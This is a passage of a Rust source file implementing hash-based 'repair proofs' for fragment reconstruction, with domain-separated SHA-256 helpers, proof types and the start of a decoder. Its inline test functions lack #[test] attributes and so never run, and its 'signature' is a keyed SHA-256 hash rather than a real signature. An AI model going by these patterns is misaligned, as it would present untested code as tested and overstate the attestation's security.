//! bd-20uo: Proof-carrying repair artifacts for decode/reconstruction paths.
//!
//! Every repair operation emits a `RepairProof` containing fragment hashes,
//! algorithm identifier, output hash, and signed attestation. Downstream
//! trust decisions (quarantine promotion, durable claims) are evidence-based.
//!
//! # Modes
//!
//! - **Mandatory**: Missing proofs are hard errors preventing use of repaired objects.
//! - **Advisory**: Missing proofs are logged as warnings but operation proceeds.
//!
//! # Invariants
//!
//! - INV-REPAIR-PROOF-COMPLETE: Every repair output has a proof or an explicit rejection.
//! - INV-REPAIR-PROOF-BINDING: Proof binds input fragments to output via signed attestation.
//! - INV-REPAIR-PROOF-DETERMINISTIC: Same inputs produce identical proof structure.

use crate::security::constant_time;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

// ---------------------------------------------------------------------------
// Event codes
// ---------------------------------------------------------------------------

pub const REPAIR_PROOF_EMITTED: &str = "REPAIR_PROOF_EMITTED";
pub const REPAIR_PROOF_VERIFIED: &str = "REPAIR_PROOF_VERIFIED";
pub const REPAIR_PROOF_MISSING: &str = "REPAIR_PROOF_MISSING";
pub const REPAIR_PROOF_INVALID: &str = "REPAIR_PROOF_INVALID";
pub const DEFAULT_MAX_AUDIT_LOG_ENTRIES: usize = 4_096;
const MAX_REGISTERED_ALGORITHMS: usize = 4096;

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow.min(items.len()));
    }
    items.push(item);
}

#[cfg(test)]
fn test_push_bounded() {
    let mut vec = vec![1, 2, 3];
    push_bounded(&mut vec, 4, 0);
    assert!(vec.is_empty(), "zero capacity should result in empty vec");

    let mut vec = vec![1, 2, 3];
    push_bounded(&mut vec, 99, 1);
    assert_eq!(vec, vec![99], "capacity 1 should keep only the new item");

    let mut vec: Vec<i32> = Vec::new();
    push_bounded(&mut vec, 42, 5);
    assert_eq!(vec, vec![42], "should add to empty vec normally");

    let mut vec = vec![1, 2, 3];
    push_bounded(&mut vec, 4, 3);
    assert_eq!(vec, vec![2, 3, 4], "should evict oldest when at capacity");

    let mut vec: Vec<i32> = (0..10).collect();
    push_bounded(&mut vec, 99, 3);
    assert_eq!(vec, vec![8, 9, 99], "should evict multiple oldest items");

    let mut vec = vec![1];
    push_bounded(&mut vec, 2, usize::MAX);
    assert_eq!(vec, vec![1, 2], "large capacity should not cause overflow");

    let mut vec: Vec<i32> = (0..1000).collect();
    push_bounded(&mut vec, 9999, 2);
    assert_eq!(vec, vec![999, 9999], "should keep last item plus new item");

    let mut vec: Vec<i32> = Vec::new();
    for i in 0..10 {
        push_bounded(&mut vec, i, 3);
    }
    assert_eq!(vec, vec![7, 8, 9], "should contain last 3 items");
}

fn usize_to_u64(value: usize) -> u64 {
    u64::try_from(value).unwrap_or(u64::MAX)
}

// Inline negative-path tests
#[cfg(test)]
fn test_usize_to_u64() {
    // Test: usize::MAX should clamp to u64::MAX on 64-bit systems
    {
        // Test: usize::MAX should clamp to u64::MAX on 64-bit systems
        assert_eq!(usize_to_u64(usize::MAX), u64::MAX, "usize::MAX should clamp to u64::MAX");

        // Test: zero value boundary
        assert_eq!(usize_to_u64(0), 0, "zero should convert cleanly");

        // Test: value that fits in u64 should convert exactly
        assert_eq!(usize_to_u64(42), 42, "small values should convert exactly");

        // Test: overflow behavior depends on platform
        #[cfg(target_pointer_width = "32")]
        {
            // On 32-bit systems, usize::MAX fits in u64
            assert!(usize_to_u64(usize::MAX) < u64::MAX);
        }

        #[cfg(target_pointer_width = "64")]
        {
            // On 64-bit systems, usize::MAX equals u64::MAX
            assert_eq!(usize_to_u64(usize::MAX), u64::MAX);
        }

        // Test: boundary at u32::MAX
        assert_eq!(usize_to_u64(u32::MAX as usize), u32::MAX as u64);
    }
}

fn update_len_prefixed(hasher: &mut Sha256, bytes: &[u8]) {
    hasher.update(usize_to_u64(bytes.len()).to_le_bytes());
    hasher.update(bytes);
}

fn update_count(hasher: &mut Sha256, count: usize) {
    hasher.update(usize_to_u64(count).to_le_bytes());
}

fn update_field(hasher: &mut Sha256, field_domain: &'static [u8], bytes: &[u8]) {
    update_len_prefixed(hasher, field_domain);
    update_len_prefixed(hasher, bytes);
}

fn update_count_field(hasher: &mut Sha256, field_domain: &'static [u8], count: usize) {
    update_len_prefixed(hasher, field_domain);
    update_count(hasher, count);
}

fn update_u64_field(hasher: &mut Sha256, field_domain: &'static [u8], value: u64) {
    update_len_prefixed(hasher, field_domain);
    hasher.update(value.to_le_bytes());
}

// Inline negative-path tests
#[cfg(test)]
fn test_update_u64_field() {
        // Test: zero value with empty domain
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, b"", 0);
        let hash = hasher.finalize();
        assert_eq!(hash.len(), 32, "zero value with empty domain should be valid");

        // Test: maximum u64 value
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, b"max_test", u64::MAX);
        let hash = hasher.finalize();
        assert_eq!(hash.len(), 32, "max u64 value should be handled");

        // Test: same value different domains should produce different hashes
        let mut hasher1 = Sha256::new();
        let mut hasher2 = Sha256::new();
        update_u64_field(&mut hasher1, b"domain_a", 12345);
        update_u64_field(&mut hasher2, b"domain_b", 12345);
        assert_ne!(hasher1.finalize(), hasher2.finalize(), "different domains should produce different hashes");

        // Test: same domain different values should produce different hashes
        let mut hasher1 = Sha256::new();
        let mut hasher2 = Sha256::new();
        update_u64_field(&mut hasher1, b"same_domain", 1000);
        update_u64_field(&mut hasher2, b"same_domain", 1001);
        assert_ne!(hasher1.finalize(), hasher2.finalize(), "different values should produce different hashes");

        // Test: power-of-two values
        let powers = [1, 2, 4, 8, 16, 32, 64, 128, 256, 512, 1024, 2048];
        let mut power_hashes = Vec::new();
        for &power in &powers {
            let mut hasher = Sha256::new();
            update_u64_field(&mut hasher, b"power", power);
            power_hashes.push(hasher.finalize());
        }
        // All should be unique
        for i in 0..power_hashes.len() {
            for j in (i+1)..power_hashes.len() {
                assert_ne!(power_hashes[i], power_hashes[j], "power-of-two values should be unique");
            }
        }

        // Test: boundary u64 values
        let boundary_values = [
            0, 1,
            u8::MAX as u64,
            u16::MAX as u64,
            u32::MAX as u64,
            u64::MAX - 1,
            u64::MAX
        ];
        let mut boundary_hashes = Vec::new();
        for &value in &boundary_values {
            let mut hasher = Sha256::new();
            update_u64_field(&mut hasher, b"boundary", value);
            boundary_hashes.push(hasher.finalize());
        }
        // All should be unique
        for i in 0..boundary_hashes.len() {
            for j in (i+1)..boundary_hashes.len() {
                assert_ne!(boundary_hashes[i], boundary_hashes[j], "boundary values should be unique");
            }
        }

        // Test: collision resistance with count field
        let mut u64_hasher = Sha256::new();
        let mut count_hasher = Sha256::new();
        let value = 98765;
        update_u64_field(&mut u64_hasher, b"field", value);
        update_count_field(&mut count_hasher, b"field", value as usize);
        assert_ne!(u64_hasher.finalize(), count_hasher.finalize(), "u64 field should differ from count field");

        // Test: collision resistance with regular field
        let mut u64_hasher = Sha256::new();
        let mut field_hasher = Sha256::new();
        let value = 0x1234567890ABCDEFu64;
        update_u64_field(&mut u64_hasher, b"test", value);
        update_field(&mut field_hasher, b"test", &value.to_le_bytes());
        assert_ne!(u64_hasher.finalize(), field_hasher.finalize(), "u64 field should differ from regular field");

        // Test: little-endian byte order consistency
        let value = 0x0102030405060708u64;
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, b"endian", value);
        let hash = hasher.finalize();

        let mut manual_hasher = Sha256::new();
        update_len_prefixed(&mut manual_hasher, b"endian");
        manual_hasher.update(value.to_le_bytes());
        let manual_hash = manual_hasher.finalize();

        assert_eq!(hash, manual_hash, "u64 field should use little-endian encoding");

        // Test: domain with special characters and u64 value
        let special_domain = b"field!@#$%^&*()";
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, special_domain, 0xDEADBEEFCAFEBABE);
        let hash = hasher.finalize();
        assert_eq!(hash.len(), 32, "special characters in domain should be handled");

        // Test: null bytes in domain with u64 value
        let null_domain = b"field\0with\0nulls";
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, null_domain, 0x123456789ABCDEF0);
        let hash = hasher.finalize();
        assert_eq!(hash.len(), 32, "null bytes in domain should be handled");

        // Test: very long domain with u64 value
        let long_domain = vec![b'L'; 8000];
        let mut hasher = Sha256::new();
        update_u64_field(&mut hasher, &long_domain, 0xFEDCBA9876543210);
        let hash = hasher.finalize();
        assert_eq!(hash.len(), 32, "very long domain should be handled");

        // Test: avalanche effect for single bit changes
        let base_value = 0x8000000000000000u64;
        let mut base_hasher = Sha256::new();
        update_u64_field(&mut base_hasher, b"avalanche", base_value);
        let base_hash = base_hasher.finalize();

        let flipped_value = base_value ^ 1; // Flip lowest bit
        let mut flipped_hasher = Sha256::new();
        update_u64_field(&mut flipped_hasher, b"avalanche", flipped_value);
        let flipped_hash = flipped_hasher.finalize();

        assert_ne!(base_hash, flipped_hash, "single bit flip should change hash");

        let differing_bits = base_hash.iter()
            .zip(flipped_hash.iter())
            .map(|(a, b)| (a ^ b).count_ones())
            .sum::<u32>();
        assert!(differing_bits > 64, "single bit change should affect many output bits");

        // Test: sequential values should produce different hashes
        let base_seq = 1000000u64;
        let mut seq_hashes = Vec::new();
        for i in 0..10 {
            let mut hasher = Sha256::new();
            update_u64_field(&mut hasher, b"sequence", base_seq + i);
            seq_hashes.push(hasher.finalize());
        }
        for i in 0..seq_hashes.len() {
            for j in (i+1)..seq_hashes.len() {
                assert_ne!(seq_hashes[i], seq_hashes[j], "sequential values should be unique");
            }
        }

        // Test: timestamp-like values (common use case)
        let timestamps = [
            1609459200, // 2021-01-01 00:00:00 UTC
            1640995200, // 2022-01-01 00:00:00 UTC
            1672531200, // 2023-01-01 00:00:00 UTC
            1704067200, // 2024-01-01 00:00:00 UTC
        ];
        let mut timestamp_hashes = Vec::new();
        for &timestamp in &timestamps {
            let mut hasher = Sha256::new();
            update_u64_field(&mut hasher, b"timestamp", timestamp);
            timestamp_hashes.push(hasher.finalize());
        }
        for i in 0..timestamp_hashes.len() {
            for j in (i+1)..timestamp_hashes.len() {
                assert_ne!(timestamp_hashes[i], timestamp_hashes[j], "timestamp values should be unique");
            }
        }

        // Test: multiple u64 fields should be order-dependent
        let mut hasher1 = Sha256::new();
        let mut hasher2 = Sha256::new();
        update_u64_field(&mut hasher1, b"first", 100);
        update_u64_field(&mut hasher1, b"second", 200);
        update_u64_field(&mut hasher2, b"second", 200);
        update_u64_field(&mut hasher2, b"first", 100);
        assert_ne!(hasher1.finalize(), hasher2.finalize(), "u64 field order should matter");

        // Test: empty domain vs non-empty domain with same value
        let mut empty_hasher = Sha256::new();
        let mut non_empty_hasher = Sha256::new();
        update_u64_field(&mut empty_hasher, b"", 99999);
        update_u64_field(&mut non_empty_hasher, b"domain", 99999);
        assert_ne!(empty_hasher.finalize(), non_empty_hasher.finalize(), "empty vs non-empty domain should differ");

        // Test: deterministic behavior across multiple calls
        for _ in 0..5 {
            let mut hasher = Sha256::new();
            update_u64_field(&mut hasher, b"deterministic", 0x123456789ABCDEF0);
            let current_hash = hasher.finalize();

            let mut reference_hasher = Sha256::new();
            update_u64_field(&mut reference_hasher, b"deterministic", 0x123456789ABCDEF0);
            let reference_hash = reference_hasher.finalize();

            assert_eq!(current_hash, reference_hash, "u64 field should be deterministic");
        }

}

fn output_hash_hex(output_data: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(b"proof_carrying_output_v1:");
    update_len_prefixed(&mut hasher, output_data);
    hex::encode(hasher.finalize())
}

// Inline negative-path tests
#[cfg(test)]
fn test_output_hash_hex() {
    // Test: empty output data should produce consistent hash
    let empty_hash1 = output_hash_hex(&[]);
    let empty_hash2 = output_hash_hex(&Vec::new());
    assert_eq!(empty_hash1, empty_hash2, "empty data should hash consistently");
    assert_eq!(empty_hash1.len(), 64, "hash should be 64 hex characters");

    // Test: single byte vs empty should differ
    let empty_hash = output_hash_hex(&[]);
    let single_hash = output_hash_hex(&[0]);
    assert_ne!(empty_hash, single_hash, "empty vs single byte should have different hashes");

    // Test: identical data should produce identical hashes
    let data = vec![1, 2, 3, 4, 5];
    let hash1 = output_hash_hex(&data);
    let hash2 = output_hash_hex(&data.clone());
    assert_eq!(hash1, hash2, "identical data should produce identical hashes");

    // Test: different data should produce different hashes
    let data1 = vec![1, 2, 3];
    let data2 = vec![1, 2, 4];
    assert_ne!(output_hash_hex(&data1), output_hash_hex(&data2), "different data should produce different hashes");

    // Test: order sensitivity
    let ordered = vec![1, 2, 3];
    let mut reversed = ordered.clone();
    reversed.reverse();
    assert_ne!(output_hash_hex(&ordered), output_hash_hex(&reversed), "hash should be order-sensitive");

    // Test: very large data should be handled
    let large_data = vec![0x42; 1_000_000];
    let large_hash = output_hash_hex(&large_data);
    assert_eq!(large_hash.len(), 64, "large data should still produce 64-char hex hash");
    assert!(large_hash.chars().all(|c| c.is_ascii_hexdigit()), "hash should be valid hex");

    // Test: all zero data vs all one data
    let zeros = vec![0u8; 100];
    let ones = vec![1u8; 100];
    assert_ne!(output_hash_hex(&zeros), output_hash_hex(&ones), "zeros vs ones should have different hashes");

    // Test: collision resistance (similar but different data)
    let data_a = b"abcdefghijklmnopqrstuvwxyz";
    let data_b = b"abcdefghijklmnopqrstuvwxyz1";
    assert_ne!(output_hash_hex(data_a), output_hash_hex(data_b), "similar data should have different hashes");
}

fn payload_hash_hex(
    object_id: &str,
    input_fragment_hashes: &[String],
    algorithm_id: &AlgorithmId,
    output_hash: &str,
    signer_id: &str,
    fragment_count: usize,
    timestamp_epoch_secs: u64,
    trace_id: &str,
) -> String {
    let mut hasher = Sha256::new();
    hasher.update(b"proof_carrying_payload_v3:");
    update_field(&mut hasher, b"field:object_id", object_id.as_bytes());
    update_count_field(
        &mut hasher,
        b"field:input_fragment_hashes_count",
        input_fragment_hashes.len(),
    );
    for hash in input_fragment_hashes {
        update_field(&mut hasher, b"field:input_fragment_hash", hash.as_bytes());
    }
    update_field(
        &mut hasher,
        b"field:algorithm_id",
        algorithm_id.as_str().as_bytes(),
    );
    update_field(&mut hasher, b"field:output_hash", output_hash.as_bytes());
    update_field(&mut hasher, b"field:signer_id", signer_id.as_bytes());
    update_count_field(&mut hasher, b"field:fragment_count", fragment_count);
    update_u64_field(
        &mut hasher,
        b"field:timestamp_epoch_secs",
        timestamp_epoch_secs,
    );
    update_field(&mut hasher, b"field:trace_id", trace_id.as_bytes());
    hex::encode(hasher.finalize())
}

fn signature_hex(signing_secret: &str, payload_hash: &str) -> String {
    let mut hasher = Sha256::new();
    hasher.update(b"proof_carrying_signature_v3:");
    update_field(
        &mut hasher,
        b"field:signing_secret",
        signing_secret.as_bytes(),
    );
    update_field(&mut hasher, b"field:payload_hash", payload_hash.as_bytes());
    hex::encode(hasher.finalize())
}

// Inline negative-path tests
#[cfg(test)]
fn test_signature_hex() {
        // Test: empty secret and empty payload hash
        let empty_sig = signature_hex("", "");
        assert_eq!(empty_sig.len(), 64, "empty inputs should produce 64-char hex signature");
        assert!(empty_sig.chars().all(|c| c.is_ascii_hexdigit()), "signature should be valid hex");

        // Test: identical secret and payload should produce valid signature
        let identical_sig = signature_hex("same", "same");
        assert_eq!(identical_sig.len(), 64, "identical secret/payload should be valid");
        assert_ne!(identical_sig, signature_hex("", ""), "identical inputs should differ from empty");

        // Test: swapped secret and payload should produce different signature
        let sig1 = signature_hex("secret", "payload");
        let sig2 = signature_hex("payload", "secret");
        assert_ne!(sig1, sig2, "swapped secret/payload should produce different signatures");

        // Test: single character differences should produce very different signatures
        let base_sig = signature_hex("secret", "hash123");
        let modified_sig = signature_hex("secret", "hash124");
        assert_ne!(base_sig, modified_sig, "single char change should change signature");

        // Count differing hex characters for avalanche effect
        let differing_chars = base_sig.chars()
            .zip(modified_sig.chars())
            .filter(|(a, b)| a != b)
            .count();
        assert!(differing_chars > 16, "single char change should affect many signature chars");

        // Test: very long secret and payload hash
        let long_secret = "x".repeat(10000);
        let long_payload = "a".repeat(10000);
        let long_sig = signature_hex(&long_secret, &long_payload);
        assert_eq!(long_sig.len(), 64, "long inputs should still produce 64-char signature");
        assert!(long_sig.chars().all(|c| c.is_ascii_hexdigit()), "long inputs should produce valid hex");

        // Test: special characters in secret and payload
        let special_secret = "secret!@#$%^&*()_+-={}[]|\\:;\"'<>?,./";
        let special_payload = "hash!@#$%^&*()_+-={}[]|\\:;\"'<>?,./";
        let special_sig = signature_hex(special_secret, special_payload);
        assert_eq!(special_sig.len(), 64, "special characters should be handled");

        // Test: Unicode in secret and payload
        let unicode_secret = "秘密_αρχείο";
        let unicode_payload = "散列_κατακερματισμός";
        let unicode_sig = signature_hex(unicode_secret, unicode_payload);
        assert_eq!(unicode_sig.len(), 64, "Unicode should be handled correctly");

        // Test: null bytes in secret and payload
        let null_secret = "secret\0with\0nulls";
        let null_payload = "hash\0with\0nulls";
        let null_sig = signature_hex(null_secret, null_payload);
        assert_eq!(null_sig.len(), 64, "null bytes should be handled");

        // Test: control characters in secret and payload
        let control_secret = "secret\r\n\t\x00\x1F";
        let control_payload = "hash\r\n\t\x00\x1F";
        let control_sig = signature_hex(control_secret, control_payload);
        assert_eq!(control_sig.len(), 64, "control characters should be handled");

        // Test: signature should be deterministic
        for _ in 0..5 {
            let sig1 = signature_hex("consistent", "test");
            let sig2 = signature_hex("consistent", "test");
            assert_eq!(sig1, sig2, "signature should be deterministic");
        }

        // Test: common secret/payload patterns should be unique
        let patterns = [
            ("secret1", "hash1"),
            ("secret2", "hash2"),
            ("admin", "deadbeef"),
            ("user", "abcdef01"),
            ("key", "fedcba98"),
        ];
        let mut pattern_sigs = Vec::new();
        for (secret, payload) in patterns {
            let sig = signature_hex(secret, payload);
            pattern_sigs.push(sig);
        }
        for i in 0..pattern_sigs.len() {
            for j in (i+1)..pattern_sigs.len() {
                assert_ne!(pattern_sigs[i], pattern_sigs[j], "different patterns should produce unique signatures");
            }
        }

        // Test: weak secrets should still produce valid signatures (no validation)
        let weak_secrets = ["", "1", "password", "123456", "admin"];
        for &weak in &weak_secrets {
            let sig = signature_hex(weak, "payload");
            assert_eq!(sig.len(), 64, "weak secrets should still produce valid signatures");
        }

        // Test: malformed hex payload should be handled as raw string
        let malformed_payloads = ["not_hex", "gggg", "ZZZZ", "12345G"];
        for &malformed in &malformed_payloads {
            let sig = signature_hex("secret", malformed);
            assert_eq!(sig.len(), 64, "malformed hex payloads should be handled as raw strings");
        }

        // Test: empty secret with various payloads
        let payloads = ["a", "ab", "abc", "1234567890abcdef"];
        let mut empty_secret_sigs = Vec::new();
        for &payload in &payloads {
            let sig = signature_hex("", payload);
            empty_secret_sigs.push(sig);
        }
        for i in 0..empty_secret_sigs.len() {
            for j in (i+1)..empty_secret_sigs.len() {
                assert_ne!(empty_secret_sigs[i], empty_secret_sigs[j], "empty secret with different payloads should be unique");
            }
        }

        // Test: various secrets with empty payload
        let secrets = ["a", "ab", "abc", "secret123"];
        let mut empty_payload_sigs = Vec::new();
        for &secret in &secrets {
            let sig = signature_hex(secret, "");
            empty_payload_sigs.push(sig);
        }
        for i in 0..empty_payload_sigs.len() {
            for j in (i+1)..empty_payload_sigs.len() {
                assert_ne!(empty_payload_sigs[i], empty_payload_sigs[j], "different secrets with empty payload should be unique");
            }
        }

        // Test: collision resistance across domain boundaries
        let sig1 = signature_hex("secre", "tpayload");
        let sig2 = signature_hex("secret", "payload");
        assert_ne!(sig1, sig2, "should prevent field boundary confusion");

        // Test: case sensitivity
        let lower_sig = signature_hex("secret", "deadbeef");
        let upper_sig = signature_hex("SECRET", "DEADBEEF");
        let mixed_sig = signature_hex("Secret", "DeadBeef");
        assert_ne!(lower_sig, upper_sig, "case should matter");
        assert_ne!(lower_sig, mixed_sig, "case should matter");
        assert_ne!(upper_sig, mixed_sig, "case should matter");

        // Test: signature should include domain separator
        let manual_sig = {
            let mut hasher = Sha256::new();
            hasher.update(b"proof_carrying_signature_v3:");
            update_field(&mut hasher, b"field:signing_secret", b"test_secret");
            update_field(&mut hasher, b"field:payload_hash", b"test_payload");
            hex::encode(hasher.finalize())
        };
        let function_sig = signature_hex("test_secret", "test_payload");
        assert_eq!(manual_sig, function_sig, "signature function should match manual implementation");

        // Test: version separation (signatures should include version in domain)
        let v3_sig = signature_hex("secret", "payload");
        // If we had a v2 version, it should be different
        let manual_v2_sig = {
            let mut hasher = Sha256::new();
            hasher.update(b"proof_carrying_signature_v2:");
            update_field(&mut hasher, b"field:signing_secret", b"secret");
            update_field(&mut hasher, b"field:payload_hash", b"payload");
            hex::encode(hasher.finalize())
        };
        assert_ne!(v3_sig, manual_v2_sig, "different versions should produce different signatures");

        // Test: all zeros vs all ones in hex payload
        let zeros_sig = signature_hex("key", &"0".repeat(64));
        let ones_sig = signature_hex("key", &"f".repeat(64));
        assert_ne!(zeros_sig, ones_sig, "all zeros vs all ones should differ");

        // Test: signature with maximum length strings
        let max_secret = "S".repeat(1_000_000);
        let max_payload = "P".repeat(1_000_000);
        let max_sig = signature_hex(&max_secret, &max_payload);
        assert_eq!(max_sig.len(), 64, "maximum length inputs should work");
}

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Proof enforcement mode.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProofMode {
    Mandatory,
    Advisory,
}

/// Registered reconstruction algorithm.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct AlgorithmId(pub String);

impl AlgorithmId {
    pub fn new(id: impl Into<String>) -> Self {
        Self(id.into())
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

// Inline negative-path tests
#[cfg(test)]
fn test_algorithm_id_new() {
    // Test: empty algorithm ID should be allowed
    let empty_algo = AlgorithmId::new("");
    assert_eq!(empty_algo.as_str(), "", "empty algorithm ID should be preserved");

    // Test: whitespace-only algorithm ID
    let whitespace_algo = AlgorithmId::new("   ");
    assert_eq!(whitespace_algo.as_str(), "   ", "whitespace algorithm ID should be preserved");

    // Test: very long algorithm ID
    let long_id = "a".repeat(10000);
    let long_algo = AlgorithmId::new(&long_id);
    assert_eq!(long_algo.as_str().len(), 10000, "long algorithm ID should be preserved");

    // Test: algorithm ID with special characters
    let special_algo = AlgorithmId::new("algo!@#$%^&*()");
    assert_eq!(special_algo.as_str(), "algo!@#$%^&*()", "special characters should be preserved");

    // Test: algorithm ID with Unicode
    let unicode_algo = AlgorithmId::new("算法_αλγόριθμος");
    assert_eq!(unicode_algo.as_str(), "算法_αλγόριθμος", "Unicode should be preserved");

    // Test: algorithm ID with control characters
    let control_algo = AlgorithmId::new("algo\n\t\r");
    assert!(control_algo.as_str().contains('\n'), "control characters should be preserved");

    // Test: algorithm ID with null bytes
    let null_algo = AlgorithmId::new("algo\0byte");
    assert!(null_algo.as_str().contains('\0'), "null bytes should be preserved");

    // Test: algorithm ID from String vs &str should be equivalent
    let str_algo = AlgorithmId::new("test");
    let string_algo = AlgorithmId::new("test".to_string());
    assert_eq!(str_algo.as_str(), string_algo.as_str(), "String and &str inputs should be equivalent");
}

impl std::fmt::Display for AlgorithmId {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// A fragment used in reconstruction.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Fragment {
    pub fragment_id: String,
    pub data: Vec<u8>,
}

impl Fragment {
    pub fn hash(&self) -> [u8; 32] {
        let mut hasher = Sha256::new();
        hasher.update(b"proof_carrying_fragment_v2:");
        update_field(
            &mut hasher,
            b"field:fragment_id",
            self.fragment_id.as_bytes(),
        );
        update_field(&mut hasher, b"field:fragment_data", &self.data);
        let result = hasher.finalize();
        let mut hash = [0u8; 32];
        hash.copy_from_slice(&result);
        hash
    }
}

// Inline negative-path tests
#[cfg(test)]
fn test_fragment_hash() {
            // Test: empty fragment ID should be handled consistently
            let empty_id_fragment = Fragment {
                fragment_id: String::new(),
                data: vec![1, 2, 3],
            };
            let hash = empty_id_fragment.hash();
            assert_eq!(hash.len(), 32, "hash should always be 32 bytes");

            // Test: empty data should be handled consistently
            let empty_data_fragment = Fragment {
                fragment_id: "test".to_string(),
                data: Vec::new(),
            };
            let hash = empty_data_fragment.hash();
            assert_eq!(hash.len(), 32, "hash should always be 32 bytes for empty data");

            // Test: identical fragments should produce identical hashes
            let frag1 = Fragment {
                fragment_id: "test".to_string(),
                data: vec![0xFF; 10],
            };
            let frag2 = Fragment {
                fragment_id: "test".to_string(),
                data: vec![0xFF; 10],
            };
            assert_eq!(frag1.hash(), frag2.hash(), "identical fragments should have identical hashes");

            // Test: fragments differing only by ID should have different hashes
            let frag_a = Fragment {
                fragment_id: "a".to_string(),
                data: vec![1, 2, 3],
            };
            let frag_b = Fragment {
                fragment_id: "b".to_string(),
                data: vec![1, 2, 3],
            };
            assert_ne!(frag_a.hash(), frag_b.hash(), "fragments with different IDs should have different hashes");

            // Test: fragments differing only by data should have different hashes
            let frag_data1 = Fragment {
                fragment_id: "same".to_string(),
                data: vec![1],
            };
            let frag_data2 = Fragment {
                fragment_id: "same".to_string(),
                data: vec![2],
            };
            assert_ne!(frag_data1.hash(), frag_data2.hash(), "fragments with different data should have different hashes");

            // Test: very long fragment ID should be handled
            let long_id = "x".repeat(10000);
            let long_id_fragment = Fragment {
                fragment_id: long_id,
                data: vec![42],
            };
            let hash = long_id_fragment.hash();
            assert_eq!(hash.len(), 32, "hash should be 32 bytes even for very long IDs");

            // Test: large fragment data should be handled
            let large_fragment = Fragment {
                fragment_id: "large".to_string(),
                data: vec![0x42; 1_000_000],
            };
            let hash = large_fragment.hash();
            assert_eq!(hash.len(), 32, "hash should be 32 bytes even for large data");
}

/// Signed attestation binding fragments to output.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Attestation {
    pub signer_id: String,
    pub signature: String,
    pub payload_hash: String,
}

/// Proof emitted during a repair/reconstruction operation.
///
/// INV-REPAIR-PROOF-BINDING: binds input_fragment_hashes to output_hash.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct RepairProof {
    pub proof_id: String,
    pub object_id: String,
    pub input_fragment_hashes: Vec<String>,
    pub algorithm_id: AlgorithmId,
    pub output_hash: String,
    pub attestation: Attestation,
    pub fragment_count: usize,
    pub timestamp_epoch_secs: u64,
    pub trace_id: String,
}

/// Result of proof verification.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum VerificationResult {
    Valid,
    InvalidFragmentHash {
        index: usize,
        expected: String,
        actual: String,
    },
    UnknownAlgorithm {
        algorithm_id: AlgorithmId,
    },
    OutputHashMismatch {
        expected: String,
        actual: String,
    },
    InvalidSignature,
    MissingProof,
}

impl VerificationResult {
    pub fn is_valid(&self) -> bool {
        matches!(self, Self::Valid)
    }

    pub fn event_code(&self) -> &'static str {
        match self {
            Self::Valid => REPAIR_PROOF_VERIFIED,
            Self::MissingProof => REPAIR_PROOF_MISSING,
            _ => REPAIR_PROOF_INVALID,
        }
    }
}

/// Audit event for proof operations.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProofAuditEvent {
    pub event_code: String,
    pub object_id: String,
    pub fragment_count: usize,
    pub algorithm: String,
    pub proof_hash: String,
    pub mode: String,
    pub trace_id: String,
}

/// Errors from proof-carrying decode operations.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProofCarryingDecodeError {
    MissingProofInMandatoryMode { object_id: String },
    InvalidProof { object_id: String, reason: String },
    ReconstructionFailed { object_id: String, reason: String },
}

impl ProofCarryingDecodeError {
    pub fn code(&self) -> &'static str {
        match self {
            Self::MissingProofInMandatoryMode { .. } => "PROOF_MISSING_MANDATORY",
            Self::InvalidProof { .. } => "PROOF_INVALID",
            Self::ReconstructionFailed { .. } => "RECONSTRUCTION_FAILED",
        }
    }
}

impl std::fmt::Display for ProofCarryingDecodeError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MissingProofInMandatoryMode { object_id } => {
                write!(f, "{}: object {object_id} has no repair proof", self.code())
            }
            Self::InvalidProof { object_id, reason } => {
                write!(f, "{}: object {object_id}: {reason}", self.code())
            }
            Self::ReconstructionFailed { object_id, reason } => {
                write!(f, "{}: object {object_id}: {reason}", self.code())
            }
        }
    }
}

impl std::error::Error for ProofCarryingDecodeError {}

/// Decode result containing reconstructed data and proof.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DecodeResult {
    pub object_id: String,
    pub output_data: Vec<u8>,
    pub proof: Option<RepairProof>,
}

// ---------------------------------------------------------------------------
// ProofCarryingDecoder
// ---------------------------------------------------------------------------

/// Decoder that emits proof artifacts during reconstruction.
///
/// INV-REPAIR-PROOF-COMPLETE: every decode either emits a proof or errors.
#[derive(Debug, Clone)]
pub struct ProofCarryingDecoder {
    mode: ProofMode,
    signer_id: String,
    signing_secret: String,
    registered_algorithms: Vec<AlgorithmId>,
    audit_log: Vec<ProofAuditEvent>,
    max_audit_log_entries: usize,
}

impl ProofCarryingDecoder {
    pub fn new(mode: ProofMode, signer_id: &str, signing_secret: &str) -> Self {
        Self::with_audit_log_capacity(
            mode,
            signer_id,
            signing_secret,
            DEFAULT_MAX_AUDIT_LOG_ENTRIES,
        )
    }

    pub fn with_audit_log_capacity(
        mode: ProofMode,
        signer_id: &str,
        signing_secret: &str,
        max_audit_log_entries: usize,
    ) -> Self {
        return Self {
            mode,
            signer_id: signer_id.to_string(),
            signing_secret: signing_secret.to_string(),
            registered_algorithms: vec![
                AlgorithmId::new("reed_solomon_8_4"),
